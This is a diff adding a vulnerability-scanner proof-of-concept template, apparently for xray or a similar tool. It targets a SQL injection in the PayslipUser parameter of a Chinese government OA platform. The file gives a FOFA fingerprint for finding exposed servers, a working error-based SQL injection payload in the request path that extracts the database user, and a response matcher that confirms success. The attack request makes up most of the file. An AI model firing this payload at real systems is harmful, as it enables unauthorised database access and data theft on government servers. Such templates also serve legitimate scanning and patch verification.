@@ -1,0 +1,15 @@
+id: poc-yaml-szt-smart-government-payslipuser-sqli
+info:
+  name: 数字通云平台智慧政务OA PayslipUser SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 数字通云平台智慧政务OA
+  fofa: body="assets/8cca19ff/css/bootstrap-yii.css"
+requests:
+- method: GET
+  path: /payslip/search/index/userid/time/time?PayslipUser[user_id]=(SELECT%204050%20FROM(SELECT%20COUNT(*),CONCAT((mid((ifnull(cast(current_user()%20as%20nchar),0x20)),1,54)),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)
+  expression: "status_code == 200 && \ncontains(body,\"SQLSTATE\") &&\ncontains(body,\"\
+    group_key\") &&\ncontains(body,\"无法执行 SQL 语句\")\n"
+variables: {}
+transport: http
